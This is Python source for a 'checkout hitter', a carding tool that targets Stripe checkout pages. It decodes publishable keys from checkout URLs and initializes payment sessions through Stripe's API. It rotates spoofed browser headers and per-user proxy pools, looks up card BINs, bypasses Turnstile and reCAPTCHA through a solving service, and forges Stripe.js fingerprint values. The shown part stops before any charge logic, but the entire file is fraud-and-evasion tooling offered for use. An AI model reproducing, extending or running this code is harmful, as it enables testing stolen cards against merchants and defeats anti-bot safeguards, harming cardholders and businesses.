"""
Checkout Hitter - Clean Version with CAPTCHA Bypass
Based on provided script with simple aiohttp approach
Supports browser fallback for restricted Stripe checkouts
"""
import re
import aiohttp
import base64
import asyncio
import time
import json
import random
import string
import hashlib
import os
import html
from urllib.parse import unquote, quote
from datetime import datetime
from typing import Dict, Optional, Tuple, List

try:
    from nopecha_solver import solve_turnstile, solve_recaptcha_v2
    NOPECHA_AVAILABLE = True
except ImportError:
    NOPECHA_AVAILABLE = False
    async def solve_turnstile(sitekey, url):
        return None
    async def solve_recaptcha_v2(sitekey, url):
        return None

PROXY_FILE = "data/proxies.json"
EMAIL_FILE = "data/emails.json"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/131.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
]

def get_random_ua():
    return random.choice(USER_AGENTS)

def get_browser_headers(ref_url=None, origin=None):
    ua = get_random_ua()
    chrome_versions = ["131.0.0.0", "130.0.0.0", "129.0.0.0", "128.0.0.0"]
    version = random.choice(chrome_versions)
    major = version.split(".")[0]
    is_chrome = "Chrome" in ua and "Chromium" not in ua and "Firefox" not in ua
    is_firefox = "Firefox" in ua
    is_safari = "Safari" in ua and "Chrome" not in ua
    headers = {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none" if not origin else "same-origin",
        "Sec-Fetch-User": "?1",
        "Cache-Control": "max-age=0",
    }
    if is_chrome:
        headers["sec-ch-ua"] = f'"Chromium";v="{major}", "Not(A:Brand";v="8", "Google Chrome";v="{major}"'
        headers["sec-ch-ua-mobile"] = "?0"
        headers["sec-ch-ua-platform"] = f'"{random.choice(["Windows", "macOS", "Linux"])}"'
    elif is_firefox:
        headers["sec-ua"] = f'Mozilla/5.0 ({random.choice(["Windows NT 10.0; Win64; x64", "Macintosh; Intel Mac OS X 10_15_7", "X11; Linux x86_64"])}; rv:{major}.0) Gecko/20100101 Firefox/{major}.0'
    elif is_safari:
        headers["sec-ch-ua"] = f'"Not_A Brand";v="8", "Chromium";v="{major}", "Google Chrome";v="{major}"'
        headers["sec-ch-ua-mobile"] = "?0"
        headers["sec-ch-ua-platform"] = f'"{random.choice(["macOS", "iOS"])}"'
    if origin:
        headers["Origin"] = origin
    if ref_url:
        headers["Referer"] = ref_url
    if random.random() > 0.5:
        headers["Viewport-Width"] = str(random.choice([1920, 1536, 1440, 1366, 1280]))
        headers["Width"] = headers["Viewport-Width"]
    return headers

def get_stripe_headers(pk=None, ref_url=None, origin=None):
    ua = get_random_ua()
    chrome_versions = ["131.0.0.0", "130.0.0.0", "129.0.0.0", "128.0.0.0"]
    version = random.choice(chrome_versions)
    major = version.split(".")[0]
    headers = {
        "User-Agent": ua,
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded",
        "DNT": "1",
        "Origin": origin or "https://checkout.stripe.com",
        "Referer": ref_url or "https://checkout.stripe.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "sec-ch-ua": f'"Chromium";v="{major}", "Not(A:Brand";v="8", "Google Chrome";v="{major}"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": f'"{random.choice(["Windows", "macOS", "Linux"])}"',
        "sec-ch-ua-arch": f'"{random.choice(["x86", "arm"])}"',
        "sec-ch-ua-bitness": "64",
        "sec-ch-ua-full-version": f'"{major}.0.0.0"',
        "sec-ch-ua-full-version-list": f'"Chromium";v="{major}.0.0.0", "Google Chrome";v="{major}.0.0.0", "Not(A:Brand";v="99.0.0.0"',
    }
    if random.random() > 0.3:
        headers["Cache-Control"] = random.choice(["no-cache", "no-store", "max-age=0", "must-revalidate"])
    return headers


# ── Proxy management ──────────────────────────────────────────────────────────

def load_proxies() -> dict:
    if os.path.exists(PROXY_FILE):
        try:
            with open(PROXY_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_proxies(data: dict):
    os.makedirs(os.path.dirname(PROXY_FILE), exist_ok=True)
    with open(PROXY_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def get_user_proxies(user_id: int) -> list:
    proxies = load_proxies()
    user_data = proxies.get(str(user_id), [])
    if isinstance(user_data, str):
        return [user_data] if user_data else []
    return user_data if isinstance(user_data, list) else []

def add_user_proxy(user_id: int, proxy: str):
    proxies = load_proxies()
    user_key = str(user_id)
    if user_key not in proxies:
        proxies[user_key] = []
    if isinstance(proxies[user_key], str):
        proxies[user_key] = [proxies[user_key]] if proxies[user_key] else []
    if proxy:
        if proxy not in proxies[user_key]:
            proxies[user_key].append(proxy)
    save_proxies(proxies)

def remove_user_proxy(user_id: int, proxy: str = None) -> bool:
    proxies = load_proxies()
    user_key = str(user_id)
    if user_key in proxies:
        if proxy is None or proxy.lower() == "all":
            del proxies[user_key]
        else:
            if isinstance(proxies[user_key], list):
                proxies[user_key] = [p for p in proxies[user_key] if p != proxy]
                if not proxies[user_key]:
                    del proxies[user_key]
            elif isinstance(proxies[user_key], str) and proxies[user_key] == proxy:
                del proxies[user_key]
        save_proxies(proxies)
        return True
    return False

def get_user_proxy(user_id: int) -> str:
    user_proxies = get_user_proxies(user_id)
    if user_proxies:
        return random.choice(user_proxies)
    return None


async def check_proxy_alive(proxy_str: str, timeout: int = 10) -> dict:
    result = {
        "proxy": proxy_str,
        "status": "dead",
        "response_time": None,
        "external_ip": None,
        "error": None
    }
    proxy_url = get_proxy_url(proxy_str)
    if not proxy_url:
        result["error"] = "Invalid format"
        return result
    try:
        start = time.perf_counter()
        async with aiohttp.ClientSession() as session:
            async with session.get(
                "http://ip-api.com/json",
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=timeout)
            ) as resp:
                elapsed = round((time.perf_counter() - start) * 1000, 2)
                if resp.status == 200:
                    data = await resp.json()
                    result["status"] = "alive"
                    result["response_time"] = f"{elapsed}ms"
                    result["external_ip"] = data.get("query")
    except asyncio.TimeoutError:
        result["error"] = "Timeout"
    except Exception as e:
        result["error"] = str(e)[:30]
    return result

async def check_proxies_batch(proxies: list, max_threads: int = 10) -> list:
    semaphore = asyncio.Semaphore(max_threads)
    async def check_with_semaphore(proxy):
        async with semaphore:
            return await check_proxy_alive(proxy)
    tasks = [check_with_semaphore(p) for p in proxies]
    return await asyncio.gather(*tasks)


# ── Email management ──────────────────────────────────────────────────────────

def load_emails() -> dict:
    if os.path.exists(EMAIL_FILE):
        try:
            with open(EMAIL_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_emails(data: dict):
    os.makedirs(os.path.dirname(EMAIL_FILE), exist_ok=True)
    with open(EMAIL_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def set_user_email(user_id: int, email: str):
    emails = load_emails()
    emails[str(user_id)] = email
    save_emails(emails)

def get_user_email(user_id: int) -> str:
    emails = load_emails()
    return emails.get(str(user_id), None)

def remove_user_email(user_id: int) -> bool:
    emails = load_emails()
    if str(user_id) in emails:
        del emails[str(user_id)]
        save_emails(emails)
        return True
    return False


# ── IP / proxy info helpers ───────────────────────────────────────────────────

def obfuscate_ip(ip: str) -> str:
    if not ip:
        return "N/A"
    parts = ip.split('.')
    if len(parts) == 4:
        return f"{parts[0][0]}XX.{parts[1][0]}XX.{parts[2][0]}XX.{parts[3][0]}XX"
    return "N/A"

async def get_proxy_info(proxy_str: str = None, timeout: int = 10) -> dict:
    result = {
        "status": "dead",
        "ip": None,
        "ip_obfuscated": None,
        "country": None,
        "city": None,
        "org": None,
        "using_proxy": False
    }
    proxy_url = None
    if proxy_str:
        proxy_url = get_proxy_url(proxy_str)
        result["using_proxy"] = True
    try:
        async with aiohttp.ClientSession() as session:
            kwargs = {"timeout": aiohttp.ClientTimeout(total=timeout)}
            if proxy_url:
                kwargs["proxy"] = proxy_url
            async with session.get("http://ip-api.com/json", **kwargs) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result["status"] = "alive"
                    result["ip"] = data.get("query")
                    result["ip_obfuscated"] = obfuscate_ip(data.get("query"))
                    result["country"] = data.get("country")
                    result["city"] = data.get("city")
                    result["org"] = data.get("isp")
    except:
        result["status"] = "dead"
    return result


# ── Core Stripe constants / sessions ─────────────────────────────────────────

HEADERS = {
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://checkout.stripe.com",
    "referer": "https://checkout.stripe.com/",
    "user-agent": get_random_ua(),
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
}

STRIPE_TURNSTILE_SITEKEY = "0x4AAAAAAAVIsCO_xv9In984"

_session = None
_charge_sessions = []

_bin_cache = {}

async def _lookup_bin_online(bin_code):
    bin_code = str(bin_code)[:6]
    if bin_code in _bin_cache:
        return _bin_cache[bin_code]

    def _flag(cc):
        if cc and len(cc) == 2:
            return ''.join(chr(0x1F1E6 + ord(c) - ord('A')) for c in cc.upper())
        return ''

    try:
        s = await get_session()
        try:
            async with s.get(f"https://bindb.rythampkhandelwal.workers.dev/bin/{bin_code}", timeout=aiohttp.ClientTimeout(total=5)) as resp:
                if resp.status == 200:
                    data = await resp.json(content_type=None)
                    brand = (data.get('Brand') or 'Unknown').upper()
                    bank = (data.get('Issuer') or 'Unknown').upper()
                    flag = _flag(data.get('isoCode2', ''))
                    result = f"{brand} | {bank} | {flag}"
                    _bin_cache[bin_code] = result
                    return result
        except Exception:
            pass
        try:
            async with s.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=aiohttp.ClientTimeout(total=4)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    brand = (data.get('brand') or 'Unknown').upper()
                    bank = (data.get('bank') or 'Unknown').upper()
                    flag = data.get('country_flag') or _flag(data.get('country_code') or data.get('country') or '')
                    result = f"{brand} | {bank} | {flag}"
                    _bin_cache[bin_code] = result
                    return result
        except Exception:
            pass
        try:
            async with s.get(f"https://lookup.binlist.net/{bin_code}", timeout=aiohttp.ClientTimeout(total=4)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    brand = (data.get('scheme') or 'Unknown').upper()
                    bank_data = data.get('bank') or {}
                    bank = (bank_data.get('name') or 'Unknown').upper()
                    country_data = data.get('country') or {}
                    flag = country_data.get('emoji') or ''
                    result = f"{brand} | {bank} | {flag}"
                    _bin_cache[bin_code] = result
                    return result
        except Exception:
            pass
    except Exception:
        pass
    return "UNKNOWN | UNKNOWN | "


def parse_proxy_format(proxy_str: str) -> dict:
    proxy_str = proxy_str.strip()
    result = {"user": None, "password": None, "host": None, "port": None, "raw": proxy_str}
    try:
        if '@' in proxy_str:
            if proxy_str.count('@') == 1:
                auth_part, host_part = proxy_str.rsplit('@', 1)
                if ':' in auth_part:
                    result["user"], result["password"] = auth_part.split(':', 1)
                if ':' in host_part:
                    result["host"], port_str = host_part.rsplit(':', 1)
                    result["port"] = int(port_str)
        else:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                result["host"] = parts[0]
                result["port"] = int(parts[1])
                result["user"] = parts[2]
                result["password"] = parts[3]
            elif len(parts) == 2:
                result["host"] = parts[0]
                result["port"] = int(parts[1])
    except:
        pass
    return result

def get_proxy_url(proxy_str: str) -> str:
    if not proxy_str:
        return None
    parsed = parse_proxy_format(proxy_str)
    if parsed["host"] and parsed["port"]:
        if parsed["user"] and parsed["password"]:
            user_encoded = quote(parsed["user"], safe='')
            pass_encoded = quote(parsed["password"], safe='')
            return f"http://{user_encoded}:{pass_encoded}@{parsed['host']}:{parsed['port']}"
        else:
            return f"http://{parsed['host']}:{parsed['port']}"
    return None


def build_proxy_variants(proxy_str: str) -> list:
    """Return multiple proxy URL variants with different schemes to try."""
    parsed = parse_proxy_format(proxy_str or "")
    if not parsed or not parsed.get("host") or not parsed.get("port"):
        return []
    host = parsed["host"]
    port = parsed["port"]
    user = parsed.get("user")
    pwd = parsed.get("password")
    auth = ""
    if user and pwd is not None:
        ue = quote(user, safe='')
        pe = quote(pwd, safe='')
        auth = f"{ue}:{pe}@"
    base = f"{auth}{host}:{port}"
    schemes = ["http://", "https://", "socks5://", "socks5h://", "socks4://"]
    return [s + base for s in schemes]

def get_currency_symbol(currency: str) -> str:
    symbols = {
        "USD": "$", "EUR": "€", "GBP": "£", "INR": "₹", "JPY": "¥",
        "CNY": "¥", "KRW": "₩", "RUB": "₽", "BRL": "R$", "CAD": "C$",
        "AUD": "A$", "MXN": "MX$", "SGD": "S$", "HKD": "HK$", "THB": "฿",
        "VND": "₫", "PHP": "₱", "IDR": "Rp", "MYR": "RM", "ZAR": "R",
        "CHF": "CHF", "SEK": "kr", "NOK": "kr", "DKK": "kr", "PLN": "zł",
        "TRY": "₺", "AED": "د.إ", "SAR": "﷼", "ILS": "₪", "TWD": "NT$"
    }
    return symbols.get(currency, "")

async def get_charge_session():
    global _charge_sessions
    for s in _charge_sessions:
        if not s.closed and len(s._connector._conns) < 50:
            return s
    s = aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(limit=50, ttl_dns_cache=300, ssl=False, keepalive_timeout=30),
        timeout=aiohttp.ClientTimeout(total=60, connect=10, sock_read=20)
    )
    _charge_sessions.append(s)
    return s


async def get_session():
    global _session
    if _session is None or _session.closed or (_session._connector and len(_session._connector._conns) > 80):
        if _session and not _session.closed:
            await _session.close()
        _session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=80, ttl_dns_cache=300, ssl=False, keepalive_timeout=30),
            timeout=aiohttp.ClientTimeout(total=60, connect=15, sock_read=25)
        )
    return _session

def extract_checkout_url(text: str) -> str:
    patterns = [
        r'https?://checkout\.stripe\.com/c/pay/cs_[^\s\"\'\<\>\)]+',
        r'https?://checkout\.stripe\.com/[^\s\"\'\<\>\)]+',
        r'https?://buy\.stripe\.com/[^\s\"\'\<\>\)]+',
        r'https?://pay\.openai\.com/c/pay/cs_[^\s\"\'\<\>\)]+',
        r'https?://invoice\.stripe\.com/[^\s\"\'\<\>\)]+',
        r'https?://secure\.epoch\.com/[^\s\"\'\<\>\)]+',
        r'https?://[a-zA-Z0-9\-\.]+epoch[a-zA-Z0-9\-\.]*\.com/[^\s\"\'\<\>\)]+',
        r'https?://[a-zA-Z0-9\-\.]+/c/pay/cs_(live|test)_[^\s\"\'\<\>\)]+',
        r'https?://[a-zA-Z0-9\-\.]+\.com/[^\s]*cs_(live|test)_[^\s\"\'\<\>\)]+',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            url = m.group(0).rstrip('.,;:')
            return url
    m = re.search(r'https?://[^\s\"\'\<\>]{10,}', text)
    if m:
        return m.group(0).rstrip('.,;:')
    return None


def detect_url_type(url: str) -> str:
    """Detect what type of payment URL this is — checkout, invoice, epoch, or unknown."""
    if not url:
        return "unknown"
    u = url.lower()
    if "invoice.stripe.com" in u or "/i/acct_" in u:
        return "invoice"
    if "epoch.com" in u or "segpay.com" in u or "nats.com" in u:
        return "epoch"
    return "checkout"

def decode_pk_from_url(url: str) -> dict:
    result = {"pk": None, "cs": None, "site": None, "stripe_account": None}
    try:
        cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url)
        if cs_match:
            result["cs"] = cs_match.group(0)
        if '#' not in url:
            return result
        hash_part = url.split('#')[1]
        hash_decoded = unquote(hash_part)
        try:
            decoded_bytes = base64.b64decode(hash_decoded)
            xored = ''.join(chr(b ^ 5) for b in decoded_bytes)
            pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', xored)
            if pk_match:
                result["pk"] = pk_match.group(0)
            acct_match = re.search(r'acct_[A-Za-z0-9]{8,}', xored)
            if acct_match:
                result["stripe_account"] = acct_match.group(0)
            site_match = re.search(r'https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', xored)
            if site_match:
                full_site = site_match.group(0)
                if "stripe.com" not in full_site.lower() and "checkout.stripe.com" not in full_site.lower():
                    result["site"] = full_site
            if not result.get("site") or "stripe.com" in result.get("site", "").lower():
                domains = re.findall(r'[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', xored)
                for d in domains:
                    d_lower = d.lower()
                    if not any(x in d_lower for x in ["stripe.com", "checkout.stripe.com", "api.stripe.com", "js.stripe.com", "m.stripe.network"]):
                        result["site"] = d
                        break
            if not result.get("site") or "stripe.com" in result.get("site", "").lower():
                from urllib.parse import urlparse
                all_urls = re.findall(r'https?://[^\s\"\'\<\>#]+', xored)
                for u in all_urls:
                    u_lower = u.lower()
                    if not any(x in u_lower for x in ["stripe.com", "checkout.stripe.com", "api.stripe.com", "js.stripe.com", "m.stripe.network", "apple.com", "google.com"]):
                        domain = urlparse(u).netloc
                        if domain:
                            result["site"] = domain
                            break
        except:
            pass
    except:
        pass
    return result

async def check_checkout_active(pk: str, cs: str, proxy_str: str = None) -> bool:
    try:
        s = await get_session()
        proxy_url = get_proxy_url(proxy_str) if proxy_str else None
        headers = get_stripe_headers(ref_url=f"https://checkout.stripe.com/pay/{cs}", origin="https://checkout.stripe.com")
        body = f"key={pk}&eid=NA&browser_locale=en-US&redirect_type=url"
        async with s.post(
            f"https://api.stripe.com/v1/payment_pages/{cs}/init",
            headers=headers,
            data=body,
            proxy=proxy_url,
            timeout=aiohttp.ClientTimeout(total=5)
        ) as r:
            data = await r.json()
            return "error" not in data
    except:
        return False

async def get_checkout_info(url: str, proxy_str: str = None) -> dict:
    start = time.perf_counter()
    result = {
        "url": url, "pk": None, "cs": None, "merchant": None, "site": None, "price": None,
        "currency": None, "product": None, "country": None, "mode": None,
        "init_data": None, "error": None, "time": 0,
        "customer_name": None, "customer_email": None, "support_email": None,
        "support_phone": None, "cards_accepted": None, "success_url": None,
        "cancel_url": None,
        "is_trial": False, "trial_period_days": None, "trial_end": None,
        "trial_amount": None, "after_trial_price": None, "setup_intent": None,
        "subscription_data": None, "stripe_account": None
    }
    url = url.strip() if url else ""
    print(f"[CO] DEBUG: Processing URL: '{url}' (len: {len(url)})")
    if not url or len(url) < 10:
        print("[CO] ERROR: URL too short or empty")
        result["error"] = "No checkout URL provided"
        result["time"] = round(time.perf_counter() - start, 2)
        return result
    try:
        decoded = decode_pk_from_url(url)
        result["pk"] = decoded.get("pk")
        result["cs"] = decoded.get("cs")
        result["site"] = decoded.get("site")
        if decoded.get("stripe_account"):
            result["stripe_account"] = decoded["stripe_account"]
        if result["cs"] and not result["pk"]:
            result["pk"] = await fetch_pk_from_checkout_page(result["cs"])
        if result["pk"] and result["cs"]:
            proxy_url = get_proxy_url(proxy_str) if proxy_str else None
            s = await get_session()
            headers = get_stripe_headers(ref_url=f"https://checkout.stripe.com/pay/{result['cs']}", origin="https://checkout.stripe.com")
            body = f"key={result['pk']}&eid=NA&browser_locale=en-US&redirect_type=url"
            for attempt in range(3):
                try:
                    async with s.post(
                        f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init",
                        headers=headers,
                        data=body,
                        proxy=proxy_url,
                        timeout=aiohttp.ClientTimeout(total=30)
                    ) as r:
                        if r.status != 200:
                            if attempt < 2:
                                await asyncio.sleep(1)
                                continue
                            result["error"] = f"HTTP {r.status}"
                            init_data = None
                        else:
                            init_data = await r.json()
                    if init_data and "error" not in init_data:
                        result["init_data"] = init_data
                        acct_direct = init_data.get("stripe_account") or init_data.get("account")
                        if acct_direct and str(acct_direct).startswith("acct_"):
                            result["stripe_account"] = str(acct_direct)
                        else:
                            acct_match = re.search(r'"(acct_[A-Za-z0-9]+)"', json.dumps(init_data))
                            if acct_match:
                                result["stripe_account"] = acct_match.group(1)
                        acc = init_data.get("account_settings", {})
                        result["merchant"] = acc.get("display_name") or acc.get("business_name")
                        break
                except asyncio.TimeoutError:
                    if attempt == 2:
                        result["error"] = "Connection Timeout (No response from Stripe)"
                    await asyncio.sleep(1)
                except Exception as e:
                    if attempt == 2:
                        result["error"] = f"Network Error ({str(e)[:30]})"
                    await asyncio.sleep(1)

            if not result.get("init_data") and proxy_str:
                variants = build_proxy_variants(proxy_str)
                for pv in variants:
                    try:
                        async with s.post(
                            f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init",
                            headers=headers,
                            data=body,
                            proxy=pv,
                            timeout=aiohttp.ClientTimeout(total=30)
                        ) as r2:
                            if r2.status != 200:
                                continue
                            init_data = await r2.json()
                            if init_data and "error" not in init_data:
                                result["init_data"] = init_data
                                break
                    except Exception:
                        continue

            if result.get("init_data"):
                init_data = result["init_data"]
                acct_direct = init_data.get("stripe_account") or init_data.get("account")
                if acct_direct and str(acct_direct).startswith("acct_"):
                    result["stripe_account"] = str(acct_direct)
                else:
                    acct_match = re.search(r'"(acct_[A-Za-z0-9]+)"', json.dumps(init_data))
                    if acct_match:
                        result["stripe_account"] = acct_match.group(1)

                acc = init_data.get("account_settings", {})
                result["merchant"] = acc.get("display_name") or acc.get("business_name")
                result["country"] = acc.get("country")
                result["support_email"] = acc.get("support_email")
                result["support_phone"] = acc.get("support_phone")

                if not result.get("site") or "stripe.com" in result.get("site", "").lower():
                    from urllib.parse import urlparse
                    for url_key in ["success_url", "cancel_url"]:
                        target_url = init_data.get(url_key)
                        if target_url and "stripe.com" not in target_url.lower():
                            result["site"] = urlparse(target_url).netloc
                            break

                result["success_url"] = init_data.get("success_url")
                result["cancel_url"] = init_data.get("cancel_url")

                lig = init_data.get("line_item_group")
                inv = init_data.get("invoice")
                if lig:
                    result["price"] = lig.get("total", 0) / 100
                    result["currency"] = lig.get("currency", "").upper()
                    if lig.get("line_items"):
                        items = lig["line_items"]
                        currency = lig.get("currency", "").upper()
                        sym = get_currency_symbol(currency)
                        product_parts = []
                        for item in items:
                            qty = item.get("quantity", 1)
                            name = item.get("name", "Product")
                            amt = item.get("amount", 0) / 100
                            interval = item.get("recurring_interval")
                            if interval:
                                product_parts.append(f"{qty} x {name} (at {sym}{amt:.2f} / {interval})")
                            else:
                                product_parts.append(f"{qty} x {name} ({sym}{amt:.2f})")
                        result["product"] = ", ".join(product_parts)
                elif inv:
                    result["price"] = inv.get("total", 0) / 100
                    result["currency"] = inv.get("currency", "").upper()

                mode = init_data.get("mode", "")
                result["mode"] = mode.upper() if mode else ("SUBSCRIPTION" if init_data.get("subscription") else "PAYMENT")

                si = init_data.get("setup_intent")
                if si:
                    result["setup_intent"] = si.get("id") if isinstance(si, dict) else si

                sub = init_data.get("subscription") or init_data.get("subscription_data") or {}
                if isinstance(sub, dict):
                    trial_end = sub.get("trial_end")
                    trial_days = sub.get("trial_period_days")
                    if trial_end or trial_days:
                        result["is_trial"] = True
                        result["trial_period_days"] = trial_days
                        result["trial_end"] = trial_end
                    result["subscription_data"] = sub

                if not result["is_trial"]:
                    if lig and lig.get("line_items"):
                        for item in lig["line_items"]:
                            if item.get("is_trial") or item.get("trial_period_days"):
                                result["is_trial"] = True
                                result["trial_period_days"] = item.get("trial_period_days")
                                break
                            desc = (item.get("description") or item.get("name") or "").lower()
                            if "trial" in desc or "free trial" in desc:
                                result["is_trial"] = True
                                break

                if not result["is_trial"] and mode == "setup":
                    result["is_trial"] = True
                    result["mode"] = "SETUP (TRIAL)"

                if not result["is_trial"] and result.get("price") == 0:
                    if mode != "payment" or init_data.get("subscription"):
                        result["is_trial"] = True

                if result["is_trial"] and lig and lig.get("line_items"):
                    for item in lig["line_items"]:
                        interval = item.get("recurring_interval")
                        amt = item.get("amount", 0) / 100
                        if interval and amt > 0:
                            sym = get_currency_symbol(lig.get("currency", "").upper())
                            result["after_trial_price"] = f"{sym}{amt:.2f}/{interval}"
                            break

                cust = init_data.get("customer") or {}
                result["customer_name"] = cust.get("name")
                result["customer_email"] = init_data.get("customer_email") or cust.get("email")

                pm_types = init_data.get("payment_method_types") or []
                if pm_types:
                    cards = [t.upper() for t in pm_types if t != "card"]
                    if "card" in pm_types:
                        cards.insert(0, "CARD")
                    result["cards_accepted"] = ", ".join(cards) if cards else "CARD"
            else:
                result["error"] = "Could not initialize checkout"

        if not result["merchant"] or not result["price"] or not result["stripe_account"]:
            page_data = await fetch_checkout_page_data(url)
            if not result["merchant"] and page_data.get("merchant"):
                result["merchant"] = page_data["merchant"]
            if not result["price"] and page_data.get("price"):
                result["price"] = page_data["price"]
            if not result["currency"] and page_data.get("currency"):
                result["currency"] = page_data["currency"]
            if not result["pk"] and page_data.get("pk"):
                result["pk"] = page_data["pk"]
            if not result["stripe_account"] and page_data.get("stripe_account"):
                result["stripe_account"] = page_data["stripe_account"]

        if result["stripe_account"]:
            print(f"[CO] Connect account: {result['stripe_account']}")

    except Exception as e:
        result["error"] = str(e)

    result["time"] = round(time.perf_counter() - start, 2)
    return result

def detect_captcha_challenge(conf: dict) -> tuple:
    if "error" in conf:
        err = conf["error"]
        err_type = err.get("type", "")
        err_code = err.get("code", "")
        err_msg = err.get("message", "").lower()
        if err_type == "captcha" or err_code == "captcha_required" or "captcha" in err_code:
            captcha_data = err.get("captcha", {})
            sitekey = captcha_data.get("sitekey", STRIPE_TURNSTILE_SITEKEY)
            captcha_type = captcha_data.get("type", "turnstile")
            print(f"[CO] CAPTCHA detected in error: type={captcha_type}, sitekey={sitekey[:20]}...")
            return True, sitekey, captcha_type
        if "captcha" in err_msg or "verify you are human" in err_msg or "bot detection" in err_msg:
            captcha_data = err.get("captcha", {})
            sitekey = captcha_data.get("sitekey", STRIPE_TURNSTILE_SITEKEY)
            captcha_type = captcha_data.get("type", "turnstile")
            print(f"[CO] CAPTCHA detected in message: type={captcha_type}")
            return True, sitekey, captcha_type
    if conf.get("captcha") or conf.get("requires_captcha"):
        captcha_data = conf.get("captcha", {})
        sitekey = captcha_data.get("sitekey", STRIPE_TURNSTILE_SITEKEY)
        captcha_type = captcha_data.get("type", "turnstile")
        print(f"[CO] CAPTCHA detected in response: type={captcha_type}")
        return True, sitekey, captcha_type
    if conf.get("intent_confirmation_challenge"):
        challenge = conf.get("intent_confirmation_challenge", {})
        challenge_type = challenge.get("type", "")
        if challenge_type in ["turnstile", "recaptcha", "captcha"]:
            sitekey = challenge.get("sitekey", STRIPE_TURNSTILE_SITEKEY)
            print(f"[CO] CAPTCHA detected in intent_confirmation_challenge: type={challenge_type}")
            return True, sitekey, challenge_type
    if "sitekey" in str(conf).lower():
        match = re.search(r'0x4[A-Z0-9_-]{18,22}', str(conf))
        if match:
            sitekey = match.group(0)
            print(f"[CO] CAPTCHA sitekey extracted from response string: {sitekey}")
            return True, sitekey, "turnstile"
    pi = conf.get("payment_intent", {})
    if isinstance(pi, dict):
        next_action = pi.get("next_action", {})
        if next_action.get("type") == "verify_with_microdeposits":
            pass
        elif "captcha" in str(next_action).lower():
            print(f"[CO] CAPTCHA detected in payment_intent.next_action")
            return True, STRIPE_TURNSTILE_SITEKEY, "turnstile"
    return False, "", ""

def _generate_stripe_fingerprint() -> dict:
    """Generate Stripe.js-like browser fingerprint (guid/muid/sid)"""
    chars = "0123456789abcdefghijklmnopqrstuvwxyz"
    stripe_js_version = random.choice(["7a7dd6d24d", "8f8f8d24d", "9a7dd6d24d", "6a7dd6d24d"])
    return {
        "guid": "".join(random.choices(chars, k=32)),
        "muid": "".join(random.choices(chars, k=32)),
        "sid": "".join(random.choices(chars, k=32)),
        "payment_user_agent": f"stripe.js/{stripe_js_version}; stripe-js-v3/{stripe_js_version}; checkout",
        "time_on_page": str(random.randint(15000, 300000)),
        "referrer": "https://checkout.stripe.com",
        "pasted_fields": "number",
    }


